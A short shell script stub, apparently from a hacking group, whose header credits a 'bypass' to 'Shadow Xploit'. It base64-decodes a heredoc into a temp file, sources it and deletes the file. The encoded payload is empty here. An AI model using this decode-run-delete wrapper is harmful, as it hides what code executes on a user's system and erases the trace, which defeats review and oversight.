# --------------------------------------------------
# Tools by : M3n0sD0n4ld
# Bypass by : ./Shadow Xploit
# Team : Dark Xploiter |OFC
# Telegram : http://t.me/ShadowXploit
# --------------------------------------------------
NFS=$(mktemp)
base64 -d  >${NFS}<<B14CK-KN1GH7

B14CK-KN1GH7
source ${NFS}
rm -rf ${NFS}